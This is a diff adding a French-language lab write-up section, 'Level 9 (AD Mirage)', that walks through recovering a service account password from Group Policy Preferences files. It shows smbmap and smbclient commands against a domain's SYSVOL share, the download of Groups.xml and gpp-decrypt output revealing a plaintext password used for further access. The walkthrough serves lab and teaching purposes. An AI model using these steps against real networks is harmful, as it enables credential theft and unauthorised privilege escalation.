@@ -459,8 +459,54 @@ Grace à cela il trouve un utilisateur valide. Il peut désormais se connecter a
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Level 9 (AD Mirage) : Faille GPP
+Level 9 (AD Mirage) : Exploitation des mots de passe GPP (Group Policy Preferences)
 
+
+Le pentester peut lister les repertoires sur le partage SMB avec ses credentials.
+
+L'outil utilisé est smbmap.
+```shell
+smbmap -H "10.1.3.1" -d mirage.local -u 'FrankCatton' -p 'P@ssw0rd'
+
+│·················································
+[+] IP: 10.1.3.1:445    Name: 10.1.3.1                  Status: Authenticated                                                                                   │·················································
+        Disk                                                    Permissions     Comment                                                                         │·················································
+        ----                                                    -----------     -------                                                                         │·················································
+        ADMIN$                                                  NO ACCESS       Remote Admin                                                                    │·················································
+        C$                                                      NO ACCESS       Default share                                                                   │·················································
+        IPC$                                                    READ ONLY       Remote IPC                                                                      │·················································
+        NETLOGON                                                READ ONLY       Logon server share                                                              │·················································
+        SYSVOL                                                  READ ONLY       Logon server share
+
+```
+                                                                                                                                                                
+Aucun repertoire semble interessant au premier abord. Cependant, le dossier SYSVOl, s'il est mal configuré, il peut representer une faille de sécurité.
+Le pentester n'a que ce chemin pour le moment pour essayer de obtenir des privileges plus élevés.
+Il va donc lister et s'interesser au dossier SYSVOL du domaine.
+
+```shell
+smbclient //10.X.X.X.X/SYSVOL -U 'mirage/FrankCatton%P@ssw0rd'
+
+cd mirage.local\Policies\{12345678-1234-1234-1234-123456789ABC}\Machine\Preferences\Groups\ 
+
+ls
+│·················································
+  .                                   D        0  Thu Jun  5 15:36:29 2025                                                                                      │·················································
+  ..                                  D        0  Thu Jun  5 15:36:29 2025                                                                                      │·················································
+  Groups.xml                          A      531  Thu Jun  5 15:36:29 2025                                                                                      │·················································
+
+
+get Groups.xml 
+
+exit
+
+gpp-decrypt.py -f Groups.xml
+
+[ * ] Username: svc-backup                                                                                                                                      │·················································
+[ * ] Password: GPPstillStandingStrong2k18   
+
+```
+Il peut desormais se connecter au PC-CLIENT du domaine avec ce compte local
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
